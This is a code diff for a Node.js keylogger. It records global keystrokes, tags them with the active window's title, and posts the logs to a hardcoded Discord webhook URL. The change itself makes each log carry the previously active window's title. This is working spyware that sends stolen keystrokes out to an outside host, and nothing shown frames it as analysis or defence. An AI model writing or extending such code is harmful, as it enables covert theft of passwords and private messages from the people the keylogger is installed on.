@@ -7,6 +7,7 @@ const activeWin = require('active-win');
 
 const v = new GlobalKeyboardListener();
 
+let previousActiveWindow;
 var l_shift_dn = false
 var l_alt_dn = false
 var r_shift_dn = false
@@ -265,6 +266,7 @@ v.addListener(function (e, down) {
 });
 
 
+
 async function monitorAndSendLogsToDiscord() {
     try {
         const windowInfo = await activeWin();
@@ -272,7 +274,7 @@ async function monitorAndSendLogsToDiscord() {
 
         if (lastActiveWindow && lastActiveWindow.title !== title) {
             if (keylogs.trim() !== '') {
-                const content = `\`\`\`[${title}] \nKeylog: ${keylogs}\`\`\``;
+                const content = `\`\`\`[Current Window: ${previousActiveWindow.title}] \nKeylog: ${keylogs}\`\`\``;
 
                 await axios.post('https://discord.com/api/webhooks/1234493931517907025/MFGroa6BPL36Y4Uis2CTInbiSCacvXCqWHKuvjrFEdjG6JqXZiVMFFYSxG7wtXOlNbRu', {
                     "content": content
@@ -282,6 +284,7 @@ async function monitorAndSendLogsToDiscord() {
             }
         }
         
+        previousActiveWindow = lastActiveWindow;
         lastActiveWindow = { title };
     } catch (error) {
         console.error('Error getting active window or sending logs to Discord:', error.message);
